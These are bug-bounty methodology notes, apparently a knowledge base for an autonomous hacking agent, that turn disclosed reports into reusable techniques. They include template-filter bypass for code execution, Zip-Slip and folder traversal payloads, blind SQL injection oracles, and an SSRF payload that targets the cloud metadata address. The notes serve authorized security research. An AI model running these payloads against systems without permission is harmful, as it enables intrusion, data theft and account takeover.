# general-technique — part 11/45 (54 segment(s))
# content-aware dedupe applied; every unique entry preserved.

## [Bugbountyskills.md] V-21: Unauthenticated server-computed quote manipulation (aberrant quantity / sign)

**Also known as:** negative-quantity pricing; quote-engine arithmetic abuse.
**Mechanism:** a quote/pricing endpoint (often unauthenticated) applies client-supplied quantities without
sign/range validation, so a negative `numbUnit` contaminates the server-computed total (paid: a 4-day
rental 2,597.76 → 2.24, with `totalExtraPrice: "-2600,00"` and `bookStatus: ok`). Violated assumption:
"quantity is a count."
**Preconditions:** a price/estimate/quote endpoint; ideally one that returns the arithmetic breakdown.
**Detect:** baseline request → collect every numeric response field → mutate each request quantity in turn
(`-1`, `-9999`, `0`, `1e9`, `"-1"` string, `null`, duplicated array entries) → diff the response arithmetic.
The discriminator is server-side recomputation vs client-side display.
**Proof of concept:** `quote_fuzz.sh <URL> <body.json>`. State the boundary: booking/payment acceptance is
UNVERIFIED unless observed — never imply a completed fraudulent booking.
**Chain it with:** `business-logic-testing` (coupon/wallet/reference misuse), `csrf-testing` if the endpoint
is session-authenticated.

## [Bugbountyskills.md] V-24: Data-store proxy read — URL segment as index + encoded-metachar edge bypass

**Also known as:** search-cluster proxy abuse; index-name injection; `%2A` wildcard.
**Mechanism:** an endpoint forwards the caller's JSON body to a backing search cluster and uses the URL
segment before `/search` verbatim as the index name; the edge blocks only the literal `*`, so `%2A` reaches
the cluster and expands to every index (paid: 2,545 shards, 10,000+ docs, 3,266 unpublished merchant records
with contact PII + internal admin config + mail templates).
**Preconditions:** a JSON-posting route whose response has ES/OpenSearch shape (`took`, `_shards`, `hits`).
**Detect:** control with a literal metacharacter (expect the edge block) → `%2A` (or `%252A`) → enumerate
`hits[]._index` → MEASURE with `size:0` counts, `wildcard` and `exists` queries → read the minimum records
with `_source` projection.
**Proof of concept:** `es_proxy_probe.sh <PROXY_BASE>`.
**Chain it with:** `info-disclosure-testing` (internal hostnames in CMS docs), `cloud-storage-recon.md`.

## [Bugbountyskills.md] V-28: Component finding proved from public source (version → tag source → changelog-after → live input)

**Also known as:** plugin source-diff proof; vulnerable component without admin access.
**Mechanism:** fingerprint the version from a public artefact (`readme.txt` "Stable tag"), fetch the SAME
version's source from the vendor's public tag, show the missing sanitiser in the exact render/export path,
correlate the changelog entry in a LATER version that added it, then demonstrate live acceptance of the
payload (paid: Contact Form DB 2.9.15 — `str_replace('"','""')` only, no `escapeFunctionCall()`; stored XSS
in the admin viewer + CSV/DDE formula injection through the public form).
**Preconditions:** a plugin/theme/CMS component with a public version string.
**Caveats:** installed ≠ activated — state the assumption; CSV/formula injection and "unproven active" are
frequently INELIGIBLE, so check the program list and frame it as the component finding it is.

### [Bugbountyskills.md] Routing rows added (append to the technique routing table)

| Observed signal | Load first | Then consider |
|---|---|---|
| A guard/captcha/WAF in front of one route; identical route reachable by a path shape | V-19 (this batch) | `info-disclosure-testing`, `bac-idor-testing` |
| `/public/`, `/open/`, `/external/` route markers; an id in an unauth response | V-20 | `bac-idor-testing`, `info-disclosure-testing` |
| Price/quote/estimate endpoint, quantities and totals in the response | V-21 | `business-logic-testing`, `csrf-testing` |
| A mutation reachable by GET/`open(`; SAML/OAuth `state`/`RelayState`/`redirect_uri` | V-22 | `csrf-testing`, `xss-testing` |
| A previously-fixed XSS param, or an edge filter blocking your payload | V-23 | `xss-testing`, `csrf-testing` |
| A JSON body proxied to a search backend; an index/collection name in the URL | V-24 | `info-disclosure-testing` |
| Opaque (base64/AES) request param; HMAC token header; `*_KEY`/`*_SECRET` in a bundle | V-25 | `bac-idor-testing`, `info-disclosure-testing` |
| "You must verify/enable first"; a role/level matrix; a locked object | V-26 | `business-logic-testing`, `bac-idor-testing` |
| Third-party `src`/`@import` host, published email domain, delegated subdomain | V-27 | `subdomain-takeover.md`, day-one recon |
| A plugin/CMS component with a public version string | V-28 | `info-disclosure-testing`, `xss-testing` |

### [Bugbountyskills.md] Binding habits this batch adds

1. **Control-first, always.** Every manipulation gets a matched control that isolates the server's behaviour
   (wrong value → error; wildcard → another record; literal metachar → 403; no/wrong key → 401; canonical
   path → guard code). Every paid report in this corpus contains one.
2. **Read the error-code LAYER**, not the status code, when judging a guard bypass.
3. **A token you minted must be proven accepted by the BUSINESS answer**, not by a 200.
4. **The report states its own boundary** — booking acceptance, plugin activation, other frames — and names
   ONE impact mechanism, not a menu.
5. **[HAZARD]** resource-exhaustion testing (malformed multipart / nested-array names / empty boundaries) is
   authorization-bound and ineligible on most programs; recorded as a hardening atom only.

## [Bugbountyskills.md] ============================================================================

The operator supplied the Magentrix/Opirus report set (ActivePage filter bypass + template poisoning,
Zip-Slip into the template directory, config-hook injection, asset-store folder traversal, feed/thumbnail
SSRF, `fil` expression injection, ORDER BY injection, review IDOR, query→edit→forgot-password ATO,
bundle credentials, CSRF delivery). Generalised into variants V-29…V-35 below; the full per-report entries,
slot numbers (§17.788–§17.796) and 5 carrier deltas are in `/root/bugbountyhuntingskills.md`; the batch
record is `/root/hackbot-architecture/knowledge/methodologies-2026-11-14.md`. Nothing was reproduced this
pass and no target was touched.

## [Bugbountyskills.md] V-29: Server-rendered template platform — the create-time content filter is not the render path

**Also known as:** ASPX/`.ascx` ActivePage RCE; denylist bypass by runtime-constructed token; lazy-compile trigger; template poisoning.
**Mechanism:** an admin/IDE surface accepts a page body through an API (`POST /rest/2.0/create` with
`Content`), writes it to disk (`~/Contents/{Version}/aspx/{Name}.ascx`) and compiles it on render
(`GET /aspx/{pageName}`) with NO further inspection. Two independent defects, either of which is reportable:
(a) the validator inspects the submitted TEXT, so a payload that builds its forbidden tokens at runtime
(`new string(new char[]{(char)60,…})`) passes and executes; (b) any FILTER-ACCEPTED write primitive can
overwrite ANOTHER page's `.ascx`, and the victim's FIRST render recompiles from disk. Deleting the record
does not remove the file (persistence). The read direction: a page that loads `web.config` and saves it under
a public path (`/contents/temp/<n>.txt`) yields unauthenticated credential disclosure.
**Preconditions:** an authenticated account that can create/edit page/template objects (admin seat — state it),
plus the platform writing templates into a worker-writable directory.
**Detect (control-first):** (1) re-send the payload the program previously blocked → record the rejection
(the fix's contract); (2) re-submit the same logic with tokens assembled at runtime → acceptance is the bypass;
(3) locate the generated file and prove the runtime compiles FROM DISK; (4) enumerate every write primitive
(content API, XML/document save, archive import, asset upload) and aim each at that directory with a benign
marker; render a SECOND page after overwriting its template and read the marker out of the response.
**Proof of concept:** benign-marker payloads only (`whoami`, `hostname`, `echo`); evidence = the marker in the
victim page's HTML + the file's persistence after the record is deleted + a private-window fetch of any file
planted under a served path.
**Chain it with:** V-32 (the folder-path traversal is the same write aimed at the asset root instead), V-30
(archive entries reach the same directory without ever passing the content filter), `xss-testing` (bundle
overwrite), `info-disclosure-testing` (config read → anonymous fetch).
**Do not report:** acceptance of the page alone, a whoami in the app-pool identity with no reachable data or
state change, or a "filter bypass" without the executed marker — land the execution, then the impact.
**Fix shape (state it):** compile from memory or a non-writable template root; allow-list the page grammar
instead of a denylist; decode/evaluate constant expressions at validation time.

## [Bugbountyskills.md] V-30: Extract-before-validate — archive entry names write payloads into compiled/served paths

**Also known as:** Zip-Slip into the template directory; traversal in an archive ENTRY NAME; the error that arrives after the write.
**Mechanism:** an import/upload feature unpacks the archive BEFORE validating entry names (or the feature's own
format check), so one entry named `..\..\6.0\aspx\<name>.ascx` lands outside the extraction root; the payload
never passes the API's content filter because it arrives as FILE BYTES. The API often still answers
`success:false` with a validation error — the write already happened.
**Preconditions:** any archive-accepting feature (LMS/SCORM/TinCan, plugin/theme ZIP, "import project",
backup restore) whose extraction target shares an ancestor with a compiled or served directory.
**Detect:** pack one entry with `../../<target>` and one with `..\..\<target>` (validators frequently strip
only `/`); upload; then VERIFY PLACEMENT by fetching the path through the app or triggering the code path —
never from the success flag. Create-then-render flows give you a predictable target name.
**Proof of concept:** a marker file's content served from the app root (proves traversal + write), then a benign
command marker if the target directory is compiled.
**Chain it with:** V-29 (the write target is the template directory → RCE without touching the content filter),
`xss-testing` (write a `.js` into a served path), `info-disclosure-testing` (overwrite a config or plant a probe).
**Do not report:** the validation error alone, or a traversal whose terminal is an unwritable/non-served path
with no read-back.

## [Bugbountyskills.md] V-32: File-store containment is per parameter AND per verb

**Also known as:** folder-path traversal; `P-SelectedFolder`; sibling-endpoint validation contrast.
**Mechanism:** a filename sanitizer and one validating sibling (`renameasset` rejecting `../`) prove containment
was intended, but the FOLDER/path parameter on upload / create-folder / delete (`P-SelectedFolder`, `path`) is
joined to the store root without canonicalization — an upload-rights user writes, OVERWRITES and DELETES anywhere
under the web root. Terminal: overwrite a shared JS bundle (`/_assets/jsbundles/site.js`) → same-origin stored XSS
on every page for every user including admins; or plant a same-origin phishing page at the root.
**Preconditions:** a file manager/asset store with distinct filename vs folder parameters; at least one sibling
verb that validates (the contrast localises the gap).
**Detect:** capture ALL verbs of the feature (upload, createfolder, rename, delete — the UI exposes only some);
send the traversal in each NON-filename parameter (`folder|dir|path|parent|target|P-SelectedFolder`); ladder the
encodings (`../`, `..\`, `..%2f`, `%2e%2e%2f`, `....//`, absolute paths); prove by FETCHING the file from its
new location, then re-send to prove OVERWRITE mode.
**Proof of concept:** marker file written to the root and served at `GET /<name>` (HTTP 200), overwrite
confirmed, `.js` accepted (`Content-Type: application/javascript`); DELETE the probe files and verify 404.
**Chain it with:** V-29 (aim the same write at the template directory), `xss-testing` (bundle overwrite →
admin-context stored XSS), `csrf-testing` (deliver the write from a tokenless endpoint).
**Do not report:** traversal whose only effect is inside the asset store, or a "can create folder" with no
file written, served or deleted.

## [Bugbountyskills.md] V-33: Blind-injection oracles on filter and sort parameters (size + type-error)

**Also known as:** `fil` expression injection with `SQL.Eval`; ORDER BY handed to the ORM; page-size boolean; conversion-error boolean.
**Mechanism:** two shapes, one discipline. (a) A list endpoint interpolates an opaque filter parameter into a
server-side EXPRESSION language that exposes a database escape hatch (`SQL.Eval("<sql>", <arg>)` → the string
runs raw); the oracle is RESPONSE SIZE (document count), not an error. (b) A sort/ORDER BY clause is passed
verbatim to the ORM whenever the key is not a known field AND the query carries an aggregate; the oracle is
T-SQL TYPE UNIFICATION — TRUE sorts an NVARCHAR column as INT → conversion error (503), FALSE sorts the INT
aggregate (200). Either oracle extracts any scalar char-by-char (`LEN`, `SUBSTRING(expr,k,1) <= '<mid>'`
binary search), and privilege probes (`IS_ROLEMEMBER('db_owner')`, `IS_SRVROLEMEMBER`, `DB_NAME()`) size the impact.
**Preconditions:** an authenticated session (often the LOWEST role — that is the impact claim); a filter/sort
parameter whose value reaches a query builder or an expression evaluator.
**Detect:** baseline → same request with `1=1` / `1=2` vs `CASE WHEN (<cond>) THEN <textcol> ELSE <intcol> END`;
diff BYTE SIZE and STATUS/error, never the body text; hunt the evaluator for `SQL.Eval`/`db.query`/`raw`/`$where`.
**Proof of concept:** the TRUE/FALSE oracle pair as the control, then `DB_NAME()`/`@@VERSION` length and one
character (metadata only under a "do not extract real data" policy), plus honest NEGATIVE probes.
**Chain it with:** `info-disclosure-testing` (tenant/user tables), `bac-idor-testing` (the same low-priv session
editing rows), `auth-bypass` (email/identity-field edit → forgot-password → ATO).
**Do not report:** an oracle with no extracted fact, or a stack trace with no data path.

### [Bugbountyskills.md] Routing rows added (append to the technique routing table)

| Observed signal | Load first | Then consider |
|---|---|---|
| An IDE/designer/page-builder API accepting markup or template content; a `/aspx/`, `/page/`, `/template/` render route | V-29 | V-30, V-32, `xss-testing` |
| An archive import (SCORM/TinCan, plugin ZIP, project restore) whose errors name entry names/paths | V-30 | V-29, `bac-idor-testing` |
| A config/template built with `replace("{{…}}", value)`; a spawned tool with hooks/includes/aliases | V-31 | `command-injection`, `bac-idor-testing` |
| A file manager with folder/path params; sibling verbs where one validates `../` | V-32 | V-29, `xss-testing`, `csrf-testing` |
| An opaque `fil=`/`where=`/`sort=`/`order` parameter; a query builder with `SQL.Eval`/`raw`/`$where` | V-33 | `info-disclosure-testing`, `bac-idor-testing` |
| A `url=`/`imgUrl=`/`feedUrl=` param plus a generated-asset serving route | V-34 | `cloud-storage-recon`, `info-disclosure-testing` |
| A job/queue payload with a type tag; a worker using `respond_to?`/duck typing | V-35 | `command-injection`, `deserialization` |
| A REST tier accepting a client-authored query language, or a generic entity-edit (`e=<Entity>`,`data={Id,…}`) | V-33 | `bac-idor-testing`, ATO chain (§12) |

### [Bugbountyskills.md] Binding habits this batch adds

1. **Name the two nouns of every validator** — the artefact it INSPECTS and the artefact the SINK consumes
   (text vs. compiled semantics; entry names vs. extraction; filename vs. folder path; known field vs. SQL text).
   The gap between the two nouns is the bug class; a validator that inspects one and the sink that consumes the
   other is the whole report.
2. **Every accepted write primitive reaches every writable directory** — enumerate the app's write paths and ask
   which land where the runtime COMPILES or SERVES; that mapping is worth more than any single payload.
3. **Response flags describe intent, not the filesystem** — verify by reading the artefact back through the app;
   an extract-before-validate implementation errors AFTER writing.
4. **When a fix closes a finding, re-run the old request as the control and then attack the CLASS** — the
   rejection message reveals the filter's shape (a denylist's shape tells you exactly what it cannot see).
5. **Silent sinks still have loud oracles** — 503-vs-200 conversion errors and list-page byte sizes are boolean
   oracles; a fetch feature's parser error text is a network oracle.

---

## [Bugbountyskills.md] §17 additions — knowledge-intake 2026-11-17 (7 entries: §17.797–§17.803)

Continues the harvest-ledger slot numbering (§17.788–§17.796 came from the operator's 2026-11-14 corpus). Full per-entry text with requests, payloads and dedupe deltas lives in `/root/bugbountyhuntingskills.md` (§INTAKE-2026-11-17/1…/7) and `/root/hackbot-architecture/knowledge/methodologies-2026-11-17.md`. Sources read 2026-11-17: HackerOne Hacktivity page 1 + disclosed report pages and the disclosed-report mirror; InfoSec Writeups; Medium bug-bounty tag; Intigriti blog index. Nothing reproduced; no target queried.

### [Bugbountyskills.md] §17.800 — AN ACL IMPLEMENTED AS A QUERY FILTER DOES NOT COVER THE BY-ID READ PATH: RESTRICTED CONTAINERS, PUBLIC CHILD STATUS, AND A SINGLE-ITEM ROUTE THAT NEVER RUNS THE HOOK

SOURCE: https://hackerone.com/reports/3801107 (WordPress/bbPress core, Critical 9.3, disclosed 2026-10-12)  read 2026-11-17
CLASS: broken access control / unauthenticated sensitive information disclosure (ACL as a listing filter).
CORE METHOD: 1. map the model — private/hidden FORUMS carry the restricted status (`private`, or a custom status registered `'private' => true`) while their TOPICS/REPLIES stay `post_status = publish`; 2. the restriction is applied only by adding the parents to an exclusion set inside a `pre_get_posts` hook (`bbp_pre_get_posts_normalize_forum_visibility()`); 3. the post types are registered `show_in_rest => true` (2.7.0 dev; 2.6.x unaffected) so core auto-registers `/wp-json/wp/v2/topic|reply|forum`; 4. `GET /wp-json/wp/v2/topic/<id>` with NO cookies returns the full restricted body — the core single-item controller reads the post directly and never runs `pre_get_posts`; 5. record the controls: the front-end, the REST COLLECTION endpoint and the plugin's own REST endpoint all DENY the same anonymous request.
DETECTION SIGNAL: ACLs enforced in a `pre_get_posts`-style query hook or by hiding listing fields; restricted containers with public child rows; `show_in_rest => true` on ACL-bearing post types; `403/302` on the collection while `/<type>/<id>` answers `200` anonymously.
CHAIN: anonymous attacker (an ID, no account) → core REST single-item by ID → member-only topics/replies in private and hidden forums → disclosure at scale by enumeration. DEDUPE: `3801107`,`pre_get_posts`, bbPress REST single-item = 0 hits (the ledger's bbPress entry is a registration-role escalation). HONESTY: not reproduced; report gives code paths, affected versions and the three denying controls.

### [Bugbountyskills.md] §17.803 — A PER-RESPONSE SECRET THAT SURVIVES A COOKIELESS REQUEST IS A CACHE LEAK: MISSING `Vary: Cookie` ON AN AUTHENTICATED RESPONSE, AND THE CSP NONCE IS THE SECRET THAT MATTERS

SOURCE: https://hackerone.com/reports/4151790 (Basecamp/app.fizzy.do, Low 3.1, disclosed 2026-11-12)  read 2026-11-17 (read in full on hackerone.com)
CLASS: shared-cache information disclosure of session-bound per-response values; CSP-bypass enabler.
CORE METHOD: 1. find a "public" surface that still renders session values — the controller opts out of auth only for the redirect (`allow_unauthenticated_access` skips `require_authentication`, `resume_session` still runs) and marks responses `Cache-Control: public, max-age=30` (`expires_in 30.seconds, public: true`); 2. test with TWO cache keys (one requested only cookieless; one requested first WHILE SIGNED IN then twice cookieless); 3. diff: the control has no `current-user-id`, a different `csp-nonce`, `timezone: UTC`; the signed-in response carries `csp-nonce`, `csrf-token`, `current-user-id`, `timezone`; the cookieless re-requests return `cf-cache-status: HIT` with rising `age` and byte-identical bodies; 4. read the key from the response — `vary: Accept, Sec-Fetch-Site` and NO `Cookie`; 5. weigh the exposure honestly: the CSP NONCE stops being per-response for the window (any HTML injection on that page becomes scriptable), `current-user-id` and `timezone` leak, flash messages ride along, the CSRF token stays cookie-bound (not a CSRF path alone).
DETECTION SIGNAL: `Cache-Control: public`/max-age on a route that also emits a CSP nonce meta, CSRF token, current-user/tz meta, flash or user CSS; `Vary` omitting `Cookie`; a framework where "allow unauthenticated" skips only the auth redirect; `cf-cache-status`/`x-cache` HIT with `age` on an authenticated response.
CHAIN: any signed-in user opens a public link (the only precondition) → the edge caches the session-bearing response under the URL alone → any visitor in the window receives the CSP nonce + user id + timezone → with ANY HTML injection on the same page the leaked nonce makes it executable (CSP bypass); standalone it is Low (3.1) and a chain primitive only. DEDUPE: `4151790`,`Vary: Cookie`,`current-user-id`,`resume_session` = 0 hits (existing cache material is poisoning/unkeyed-header and the `Set-Cookie`-in-public-response blob leak). HONESTY: not reproduced; the report ships `poc.sh` output, the body diff and the triage→Low-3.1→Resolved exchange, and explicitly does NOT claim exploitability without an injection.

## [bugbountyhuntingskills.md] Bug Bounty Hunting Skills

Working notes: extraction of **core exploitation methods** from published (disclosed) bug bounty
reports and blackbox writeups. Each entry records the *reusable method* — the exact steps, payload
shape, or logic — not just the outcome, so it can be re-tested against a different target.

**Entry contract (standing order).** Every entry carries `SOURCE: <url> <date read>` and a
`STATUS:` line. A technique that was not reproduced on a lab or a first-hand PoC is
`STATUS: UNVERIFIED (not reproduced)` and is chain-reference only — never promoted as fact. A
source that was never opened is not admitted. Prefer material from the last 6–12 months; bypasses
age out. Low-signal material (info disclosure, reflected params, open redirect, verbose errors,
weak headers) is recorded only as the first link of a documented chain, never as a standalone entry.

**Scope & ethics.** Every entry below comes from a publicly disclosed report or writeup. Disclosure
is not authorization: a writeup naming a program does not mean that program is in scope today, or
that it still has a live bounty. Verify the program brief and current scope before sending a single
request. Test only assets you own or have explicit written permission to test.

**Recon dork used to source these** (corrected — the commonly circulated version contains an
invalid `site::` operator that silently breaks every site filter):

```
("blackbox" OR "black-box") ("writeup" OR "report" OR "pentest")
(site:hackerone.com OR site:medium.com OR site:pentesterland.com
 OR site:infosecwriteups.com OR site:intigriti.com OR site:bugcrowd.com)
```

Run one domain per query where possible — Google drops or mangles long `OR`-chained `site:` clauses
and truncates queries past ~32 tokens.

---

---

## [bugbountyhuntingskills.md] 0. AGENT DECISION TREE — route by observation (READ THIS FIRST)

Never read this file top-to-bottom. Read `/root/hackbot-architecture/SEVERITY_DOCTRINE.md` for
what is reportable (P1/P2/P3 only), then run this tree and go to the ONE section that matches
what you observed.

**Sections of this file:** §1 XSS · §2 SSRF · §3 IDOR/BOLA · §7 SQLi · §8 traversal/LFI ·
§9 source & .git exposure · §10 info disclosure/PII · §11 auth & header bypass · §12 ATO + XSS
chains · §13 command injection & code execution · §17 new intake (append target) — incl.
**§17.788–§17.796 (batch 308, server-rendered template platform):** filter-vs-render-path template
compile · Zip-Slip into the compiled-template directory · `$'` replacement-token config/hook injection ·
per-parameter/per-verb file-store containment · `SQL.Eval` filter-expression and ORDER BY blind oracles
(size + type-error) · SSRF store-then-serve exfiltration · deserialization gadget + `respond_to?` dispatch.
Playbook variants V-29…V-35 in `/root/Bugbountyskills.md`; loadable atoms A-20…A-27 in
`web-vulnerability-hunting/references/technique-atoms.md` (ASP.NET surface in `aspnet-route-oracles.md`).
Full routing table (class → minimal test → section): `/root/hackbot-architecture/knowledge/SKILL-TREE.md`.

```
START
│
├─ 0. SCOPE GATE ──────────────────────────────────────────── cannot be skipped
│    IF  asset is not in the program's in-scope list ............ STOP. Send no request.
│    IF  class is on the HackerOne core-ineligible list ......... CHAIN PRIMITIVE only.
│    IF  you cannot prove impact twice, with your own accounts .. it is a LEAD, not a report.
│
├─ 1. ROUTE BY OBSERVATION ────────────── pick exactly ONE, then go to its playbook
│    IF  an API path / query / body carries an object id ....... BAC · IDOR · BOLA      → §3, §11
│    IF  there is a login, SSO, OAuth, JWT, or session cookie .. AUTH · OAUTH · JWT      → §11, §12
│    IF  any feature fetches a URL you influence ............... SSRF                    → §2
│    IF  your input is stored or rendered on any page .......... XSS                     → §1, §12
│    IF  input reaches a database query ........................ SQLi · NoSQLi           → §7
│    IF  input reaches a shell, template, or deserializer ...... RCE · SSTI · deserialize → §13
│    IF  a file, path, archive or export is accepted/served .... LFI · traversal        → §8
│    IF  XML, serialized blobs, or signed cookies are parsed ... XXE · deserialization  → §13
│    IF  money, credits, coupons, quota, or a workflow step .... BUSINESS LOGIC
│    IF  source, .git, .env, buckets or backups are exposed .... SECRET → INFO DISCLOSURE → §9, §10
│    IF  an admin / internal / undocumented route answers ...... ADMIN · INTERNAL ACCESS → §11
│    ELSE ........................................................ go to RECON, get one of the above
│
├─ 2. BLOCKED? ────────────────────────── classify the block FIRST, then act
│    IF  WAF / filter / validation / encoding stopped you ...... BYPASS LADDER (5 tries / 20 min)
│    IF  auth required, role denied, or tenant denied .......... ESCALATE (sibling / higher account)
│    IF  allow-list, rate limit, sandbox, or feature flag ...... change SURFACE, re-enter at 1
│    IF  bypass failed after 5 attempts or 20 min .............. STOP grinding → CHAIN or change asset
│
├─ 3. PRIMITIVE IN HAND? (P4/P5 — NEVER a report, never queued) ─── chain it or hold it
│    IF  it reads internal or foreign data .................... chain: read → IDOR → disclosure
│    IF  it redirects anywhere ................................ chain: redirect → OAuth/token theft → ATO
│    IF  it leaks a secret, key, or token ..................... chain: secret → auth bypass → admin → RCE
│    IF  it leaks a version, banner, or stack trace ............ chain: version → known CVE or debug route
│    IF  it reflects input .................................... chain: reflect → stored / admin-context XSS
│    IF  it discloses an error or object model ................ chain: error → backend query → SQLi
│    IF  it lets you upload or write a file ................... chain: write → traversal/serve → RCE
│    ELSE ...................................................... HOLD. Do not draft. Do not queue.
│
└─ 4. FINAL IMPACT GATE ──────────────── severity is judged at the LAST link of the chain
     IF  chain reaches high/critical (data · action · money · account · host) → VERIFY → REPORT
     IF  chain never reaches high/critical ..................................... drop it in silence
     ALWAYS  before any draft → DRIFT AUDIT (doctrine §7): grade your last 5 candidates;
             3 or more at P4/P5 ⇒ you are drifting ⇒ change asset or class, never lower the floor.
```

Hard stops: no out-of-scope request · never touch real user data (stop at proof) · non-destructive
only · nothing reported until reproduced twice end-to-end · P4/P5 never ships alone.

---

### [bugbountyhuntingskills.md] 1.5 Filter-logic bypass by shape, not by payload list

**Sources:** HackerOne #44217 (greedy `<...>` regex filter — strips everything from the first `<`
to the last `>`, defeated by nesting constructs so a valid tag survives the strip);
#534450 (Grammarly: value encoded inside `<img>` but **not** inside the sibling `<noscript>`, plus
client-writable `gnar_containerId` cookie → account takeover).

**Core method**
- Characterise the filter as an algorithm before attacking it. Determine: is it greedy or lazy, does
  it recurse, does it run once or loop until stable, does it operate on the raw string or the parsed
  DOM.
- Greedy "strip between first `<` and last `>`" is defeated by supplying *two* tag-like regions so
  the removal of one exposes the other.
- For encoding gaps: find parallel contexts rendering the same value (attribute, text node,
  `<noscript>`, JSON blob, meta refresh). The weakest context sets the ceiling.
- Grammarly chain extends past XSS: the payload was placed in a cookie the app trusted as a config
  container (`gnar_containerId`), converting reflected XSS into ATO against `HttpOnly` session
  cookies — no cookie theft needed.

**Lesson.** Enumerate rendering contexts, not payloads. A single value rendered in five contexts has
five independent encoding requirements, and the report only needs one to be wrong.

---

### [bugbountyhuntingskills.md] 1.6 Third-party / infrastructure inheritance (dangling CNAME)

**Source:** HackerOne #1028332 — HackerOne `events.hackerone.com`, CNAME to a third-party vendor
with authenticated stored XSS; chained CSRF + self-XSS to reflected XSS on the HackerOne subdomain.

**Core method**
- Enumerate subdomains and resolve each one. Any host pointing at a SaaS/vendor via CNAME is out of
  the app's codebase but *inside* its origin and cookie scope.
- Find the weakest vendor endpoint that reflects or stores input, then bridge it back: CSRF the
  victim into the vendor's stored-XSS sink so the payload lands on the branded subdomain.
- Report as "vulnerability inheritance" — the finding is the *trust boundary*, not the vendor bug.

**Transferable test.** `dig`/`dnsx` every in-scope subdomain; flag CNAMEs to
SaaS (status pages, event platforms, helpdesks, form builders, docs). Those are high-yield because
the vendor rarely considers the customer's cookie scope.

---

### [bugbountyhuntingskills.md] 2.5 Known-vulnerable component with a URL parameter

**Source:** HackerOne #326040 — U.S. DoD, Jira OAuth plugin, `CVE-2017-9506`.

**Core method**
- Fingerprint the exact component and version, then map to a public CVE with a known parameter.
- Here: `/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/public-ipv4`
- Enumerate beyond the one-shot payload: the report performed **XSPA** (cross-site port attack) by
  measuring response timing per port to map the internal network, reaching internal DoD services
  behind a firewall.
- Escalated from "info disclosure" to "critical" purely on enumeration depth — triage explicitly
  commented that the extra enumeration is what raised it.

**Lesson.** Version-to-CVE mapping is legitimate, high-yield recon on enterprise software. And the
difference between a $500 and a $5,000 report is often the *map you produce afterwards*, not the
initial hit.

---

### [bugbountyhuntingskills.md] 2.6 Probing localhost services from inside a browser context

**Source:** HackerOne #781295 — h1-415 CTF, *"SSRF in headless chrome with remote debugging"*.

**Core method**
- With XSS on `localhost:3000`, CORS blocked reading other localhost origins — so pivot from
  *reading* to *probing*.
- Use `<iframe>` loads and measure `onload`/timing to determine which localhost ports respond
  (no CORS needed to detect existence).
- Sweep common ports; found **9222** — Chrome remote debugging — and enumerated its HTTP endpoints
  for sensitive data.

**Transferable test.** Same-origin policy blocks reads, not the request. Timing and `onload`/`onerror`
oracles turn any client-side injection into a port scanner. Sweep 9222 (CDP), 3000, 5000, 8080,
2375 (Docker), 6379, 9200, 11211.

---

### [bugbountyhuntingskills.md] 3.1 Swap the identifier in a path parameter, then enumerate

**Sources:** HackerOne #3382343 (Nextcloud Out-of-Office API, `userId` path param, no ownership
check, Python script enumerated users); #2487889 (HackerOne `/bugs.json` exposed private report
metadata — title, url, id, state, severity, reporter — Critical 9.3); #2528293 (GitLab ML model
registry, $1,160).

**Core method**
- Authenticate as a **low-privilege** user (user B). Capture every request that references an object
  or user identifier.
- Replace B's identifier with A's, keeping B's token. No token swap — that's the whole test.
- The check must be: does the *server* verify ownership, or does it trust that the client only sends
  its own IDs?
- Build the enumeration script once the single-object swap works: iterate a user/object list, log
  status + body-length deltas, and treat a uniform 200 with varying content as confirmation.
- Look for **secondary serializers**: `?format=json`, `.json`, `/api/` variants of a UI page often
  skip the authorization filter the HTML route applies (`/bugs.json` is exactly this).

**Transferable test.** For each object reference, try: swap ID, try adjacent IDs (±1), try the JSON
sibling of the HTML endpoint, try the object ID in a different tenant/organisation context.

---

## [bugbountyhuntingskills.md] 4. Cross-cutting methodology extracted from the set

- **Read the source when you can get it.** #3447021 and #998398 were both found by reading code, not
  by fuzzing. Open-source plugins, shipped JS bundles, and decompiled APKs turn blackbox guessing
  into a directed search for an asymmetry (escaped here, unescaped there; validated here, trusted
  there).
- **The asymmetry is the bug.** Every entry above is a control applied to one path and not its
  sibling: one array element escaped and its neighbour not; sanitizer before HTML generation and not
  after; allowlist checked pre-redirect and not post; ownership checked on the HTML route and not the
  `.json` one; auth on the current endpoint and not the retired one.
- **Errors and logs are oracles.** #2262382 (error message), #2301565 (webhook delivery log),
  #326040 (timing). Budget as much time for the failure path as the success path.
- **Escalate by enumeration, not by payload.** #326040 went info-disclosure → critical through port
  mapping. #3382343 and #2487889 were proven with scripts and counts, not a single request. A map
  with volume is a materially different report.
- **Severity is argued, not measured.** #2139190 shows the CVSS haggling (Availability High vs Low)
  and #3154983 shows the impact re-framing that moved a finding from disputed to High. Write the
  impact section as an argument against the reviewer's likely objection.
- **Check whether the endpoint is still live before investing.** Several of these are now patched
  (CVE-2017-9506, CVE-2019-5464, CVE-2021-22969, CVE-2026-21642). Re-run the fingerprint before
  treating a writeup as a current finding.

---

## [bugbountyhuntingskills.md] 5. Reusable test checklist

- [ ] Map every parameter that takes a URL → SSRF callback, then force the error path.
- [ ] Map every object/user identifier → swap with a second account, including in mutations.
- [ ] Find the JSON/API sibling of every HTML route and re-test authorization there.
- [ ] Enumerate rendering contexts for any reflected/stored value (attribute, text, `<noscript>`,
      JSON, meta, style) — the weakest context wins.
- [ ] List every post-sanitization transformer (highlighter, markdown, emoji, linkifier) and test
      each as a fresh injection point.
- [ ] Enumerate upload types → verify served `Content-Type` and `nosniff` on the storage origin.
- [ ] `dig` every subdomain → flag CNAMEs to SaaS vendors inside the cookie scope.
- [ ] Decompile the mobile app → diff its endpoints against the documented API → test the leftovers.
- [ ] For any allowlist/blocklist, test: redirect chain, DNS rebinding, encoding variants, and
      decode-after-validate.
- [ ] Enumerate localhost ports from any client-side injection using iframe timing.

---

## [bugbountyhuntingskills.md] 6. Source index

| # | Report | Class | Reward / Severity |
|---|---|---|---|
| 3447021 | Automattic — unescaped admin notice XSS | Stored XSS | — |
| 3470970 | Revive Adserver — `executionorder` RXSS | Reflected XSS | Medium 6.1, CVE-2026-21642 |
| 1398305 | GitLab — comment XSS, filter + CSP bypass | Stored XSS | $3,000, High 8.7 |
| 998398 | Elastic/Swiftype — prototype pollution → XSS | DOM XSS | High 7–8.9 |
| 2306491 | TikTok Ads — MP4/XML upload XSS | Stored XSS | Low |
| 1504202 | TikTok Ads — SVG upload XSS | DOM XSS | Medium 6.5 |
